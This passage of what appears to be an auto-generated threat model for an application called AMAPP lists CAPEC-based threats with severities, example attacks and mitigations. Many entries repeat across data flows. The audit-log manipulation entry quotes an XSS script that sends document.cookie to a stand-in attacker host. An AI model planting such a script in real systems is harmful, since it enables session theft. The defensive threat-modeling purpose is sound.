  <p>Assume all input might use an improper representation. Use canonicalized data inside the application; all data must be converted into the representation used inside the application (UTF-8, UTF-16, etc.)Assume all input is malicious. Create a white list that defines all valid input to the software system based on the requirements specifications. Input that does not match against the white list should not be permitted to enter into the system. Test your decoding process against malicious input.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/267.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC15   --   Schema Poisoning</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>In a JSON Schema Poisoning Attack, an adervary modifies the JSON schema to cause a Denial of Service (DOS) or to submit malicious input: { title: Contact, type: object, properties: { Name: { type: string }, Phone: { type: string }, Email: { type: string }, Address: { type: string } }, required: [Name, Phone, Email, Address] } If the &#x27;name&#x27; attribute is required in all submitted documents and this field is removed by the adversary, the application may enter an unexpected state or record incomplete data. Additionally, if this data is needed to perform additional functions, a Denial of Service (DOS) may occur.In a Database Schema Poisoning Attack, an adversary alters the database schema being used to modify the database in some way. This can result in loss of data, DOS, or malicious input being submitted. Assuming there is a column named name, an adversary could make the following schema change: ALTER TABLE Contacts MODIFY Name VARCHAR(65353); The Name field of the Conteacts table now allows the storing of names up to 65353 characters in length. This could allow the adversary to store excess data within the database to consume system resource or to execute a DOS.</p>
  <h6>Mitigations</h6>
  <p>Design: Protect the schema against unauthorized modification.Implementation: For applications that use a known schema, use a local copy or a known good repository instead of the schema reference supplied in the schema document.Implementation: For applications that leverage remote schemas, use the HTTPS protocol to prevent modification of traffic in transit and to avoid unauthorized modification.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/271.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC18   --   Session Hijacking - ClientSide</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>Cross Site Injection Attack is a great example of Session Hijacking. Attacker can capture victim’s Session ID using XSS attack by using javascript. If an attacker sends a crafted link to the victim with the malicious JavaScript, when the victim clicks on the link, the JavaScript will run and complete the instructions made by the attacker.</p>
  <h6>Mitigations</h6>
  <p>Properly encrypt and sign identity tokens in transit, and use industry standard session key generation mechanisms that utilize high amount of entropy to generate the session key. Many standard web and application servers will perform this task on your behalf. Utilize a session timeout for all sessions. If the user does not explicitly logout, terminate their session after this period of inactivity. If the user logs back in then a new session key should be generated.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/593.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   INP41   --   Argument Injection</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>A recent example instance of argument injection occurred against Java Web Start technology, which eases the client side deployment for Java programs. The JNLP files that are used to describe the properties for the program. The client side Java runtime used the arguments in the property setting to define execution parameters, but if the attacker appends commands to an otherwise legitimate property file, then these commands are sent to the client command shell. [R.6.2]</p>
  <h6>Mitigations</h6>
  <p>Design: Do not program input values directly on command shell, instead treat user input as guilty until proven innocent. Build a function that takes user input and converts it to applications specific types and values, stripping or filtering out all unauthorized commands and characters in the process.Design: Limit program privileges, so if metacharacters or other methods circumvent program input validation routines and shell access is attained then it is not running under a privileged account. chroot jails create a sandbox for the application to execute in, making it more difficult for an attacker to elevate privilege even in the case that a compromise has occurred.Implementation: Implement an audit log that is written to a separate host, in the event of a compromise the audit log may be able to provide evidence and details of the compromise.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/6.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC20   --   Reusing Session IDs (aka Session Replay) - ClientSide</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>OpenSSL and SSLeay allow remote attackers to reuse SSL sessions and bypass access controls. See also: CVE-1999-0428Merak Mail IceWarp Web Mail uses a static identifier as a user session ID that does not change across sessions, which could allow remote attackers with access to the ID to gain privileges as that user, e.g. by extracting the ID from the user&#x27;s answer or forward URLs. See also: CVE-2002-0258</p>
  <h6>Mitigations</h6>
  <p>Always invalidate a session ID after the user logout.Setup a session time out for the session IDs.Protect the communication between the client and server. For instance it is best practice to use SSL to mitigate man in the middle attack.Do not code send session ID with GET method, otherwise the session ID will be copied to the URL. In general avoid writing session IDs in the URLs. URLs can get logged in log files, which are vulnerable to an attacker.Encrypt the session data associated with the session ID.Use multifactor authentication.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/60.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC21   --   Cross Site Request Forgery</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP API </p>
  <h6> Severity </h6>
  <p>Very High</p>
  <h6>Example Instances</h6>
  <p>While a user is logged into his bank account, an attacker can send an email with some potentially interesting content and require the user to click on a link in the email. The link points to or contains an attacker setup script, probably even within an iFrame, that mimics an actual user form submission to perform a malicious activity, such as transferring funds from the victim&#x27;s account. The attacker can have the script embedded in, or targeted by, the link perform any arbitrary action as the authenticated user. When this script is executed, the targeted application authenticates and accepts the actions based on the victims existing session cookie.See also: Cross-site request forgery (CSRF) vulnerability in util.pl in @Mail WebMail 4.51 allows remote attackers to modify arbitrary settings and perform unauthorized actions as an arbitrary user, as demonstrated using a settings action in the SRC attribute of an IMG element in an HTML e-mail.</p>
  <h6>Mitigations</h6>
  <p>Use cryptographic tokens to associate a request with a specific action. The token can be regenerated at every request so that if a request with an invalid token is encountered, it can be reliably discarded. The token is considered invalid if it arrived with a request other than the action it was supposed to be associated with.Although less reliable, the use of the optional HTTP Referrer header can also be used to determine whether an incoming request was actually one that the user is authorized for, in the current context.Additionally, the user can also be prompted to confirm an action every time an action concerning potentially sensitive data is invoked. This way, even if the attacker manages to get the user to click on a malicious link and request the desired action, the user has a chance to recover by denying confirmation. This solution is also implicitly tied to using a second factor of authentication before performing such actions.In general, every request must be checked for the appropriate authentication token as well as authorization in the current session context.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/62.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC01   --   Privilege Abuse</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary that has previously obtained unauthorized access to certain device resources, uses that access to obtain information such as location and network information.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication and authorization mechanisms. A proven protocol is OAuth 2.0, which enables a third-party application to obtain limited access to an API.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/122.html, http://cwe.mitre.org/data/definitions/732.html, http://cwe.mitre.org/data/definitions/269.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DO02   --   Excessive Allocation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>In an Integer Attack, the adversary could cause a variable that controls allocation for a request to hold an excessively large value. Excessive allocation of resources can render a service degraded or unavailable to legitimate users and can even lead to crashing of the target.</p>
  <h6>Mitigations</h6>
  <p>Limit the amount of resources that are accessible to unprivileged users. Assume all input is malicious. Consider all potentially relevant properties when validating input. Consider uniformly throttling all requests in order to make it more difficult to consume resources more quickly than they can again be freed. Use resource-limiting settings, if possible.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/130.html, http://cwe.mitre.org/data/definitions/770.html, http://cwe.mitre.org/data/definitions/404.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR05   --   Encryption Brute Forcing</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>Low</p>
  <h6>Example Instances</h6>
  <p>In 1997 the original DES challenge used distributed net computing to brute force the encryption key and decrypt the ciphertext to obtain the original plaintext. Each machine was given its own section of the key space to cover. The ciphertext was decrypted in 96 days.</p>
  <h6>Mitigations</h6>
  <p>Use commonly accepted algorithms and recommended key sizes. The key size used will depend on how important it is to keep the data confidential and for how long.In theory a brute force attack performing an exhaustive key space search will always succeed, so the goal is to have computational security. Moore&#x27;s law needs to be taken into account that suggests that computing resources double every eighteen months.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/20.html, http://cwe.mitre.org/data/definitions/326.html, http://cwe.mitre.org/data/definitions/327.html, http://cwe.mitre.org/data/definitions/693.html, http://cwe.mitre.org/data/definitions/719.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE04   --   Audit Log Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> AMAPP DB </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>The attacker alters the log contents either directly through manipulation or forging or indirectly through injection of specially crafted input that the target software will write to the logs. This type of attack typically follows another attack and is used to try to cover the traces of the previous attack. Insert a script into the log file such that if it is viewed using a web browser, the attacker will get a copy of the operator/administrator&#x27;s cookie and will be able to gain access as that user. For example, a log file entry could contain &lt;script&gt;new Image().src=&#x27;http://xss.attacker.com/log_cookie?cookie=&#x27;+encodeURI(document.cookie);&lt;/script&gt; The script itself will be invisible to anybody viewing the logs in a web browser (unless they view the source for the page).</p>
  <h6>Mitigations</h6>
  <p>Use Principle of Least Privilege to avoid unauthorized access to log files leading to manipulation/injection on those files. Do not allow tainted data to be written in the log file without prior input validation. Whitelisting may be used to properly validate the data. Use synchronization to control the flow of execution. Use static analysis tool to identify log forging vulnerabilities. Avoid viewing logs with tools that may interpret control characters in the file, such as command-line shells.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/268.html, https://capec.mitre.org/data/definitions/93.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Submit registration data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Submit registration data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Submit registration data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Submit registration data </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Submit registration data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Store user data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Store user data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Store user data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Store user data </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Store user data </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Review registration requests </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Review registration requests </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Review registration requests </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Review registration requests </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Review registration requests </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Update approval status </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Update approval status </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Update approval status </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Update approval status </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Update approval status </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE01   --   Interception</summary>
  <h6> Targeted Element </h6>
  <p> Notify approval decision </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Adversary tries to block, manipulate, and steal communications in an attempt to achieve a desired negative technical impact.</p>
  <h6>Mitigations</h6>
  <p>Leverage encryption to encode the transmission of data thus making it accessible only to authorized parties.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/117.html, http://cwe.mitre.org/data/definitions/319.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   AC05   --   Content Spoofing</summary>
  <h6> Targeted Element </h6>
  <p> Notify approval decision </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An attacker finds a site which is vulnerable to HTML Injection. He sends a URL with malicious code injected in the URL to the user of the website(victim) via email or some other social networking site. User visits the page because the page is located within trusted domain. When the victim accesses the page, the injected HTML code is rendered and presented to the user asking for username and password. The username and password are both sent to the attacker&#x27;s server.</p>
  <h6>Mitigations</h6>
  <p>Validation of user input for type, length, data-range, format, etc. Encoding any user input that will be output by the web application.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/148.html, http://cwe.mitre.org/data/definitions/345.html, https://cwe.mitre.org/data/definitions/299.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   DE03   --   Sniffing Attacks</summary>
  <h6> Targeted Element </h6>
  <p> Notify approval decision </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>Attacker knows that the computer/OS/application can request new applications to install, or it periodically checks for an available update. The attacker loads the sniffer set up during Explore phase, and extracts the application code from subsequent communication. The attacker then proceeds to reverse engineer the captured code.</p>
  <h6>Mitigations</h6>
  <p>Encrypt sensitive information when transmitted on insecure mediums to prevent interception.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/157.html, http://cwe.mitre.org/data/definitions/311.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR06   --   Communication Channel Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Notify approval decision </p>
  <h6> Severity </h6>
  <p>High</p>
  <h6>Example Instances</h6>
  <p>Using MITM techniques, an attacker launches a blockwise chosen-boundary attack to obtain plaintext HTTP headers by taking advantage of an SSL session using an encryption protocol in CBC mode with chained initialization vectors (IV). This allows the attacker to recover session IDs, authentication cookies, and possibly other valuable data that can be used for further exploitation. Additionally this could allow for the insertion of data into the stream, allowing for additional attacks (CSRF, SQL inject, etc) to occur.</p>
  <h6>Mitigations</h6>
  <p>Encrypt all sensitive communications using properly-configured cryptography.Design the communication system such that it associates proper authentication/authorization with each channel/message.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/216.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>

<details>
  <summary>   CR08   --   Client-Server Protocol Manipulation</summary>
  <h6> Targeted Element </h6>
  <p> Notify approval decision </p>
  <h6> Severity </h6>
  <p>Medium</p>
  <h6>Example Instances</h6>
  <p>An adversary could exploit existing communication protocol vulnerabilities and can launch MITM attacks and gain sensitive information or spoof client/server identities.</p>
  <h6>Mitigations</h6>
  <p>Use strong authentication protocols.</p>
  <h6>References</h6>
  <p>https://capec.mitre.org/data/definitions/220.html, http://cwe.mitre.org/data/definitions/757.html</p>
  &nbsp;
  &nbsp;
  &emsp;
</details>
|

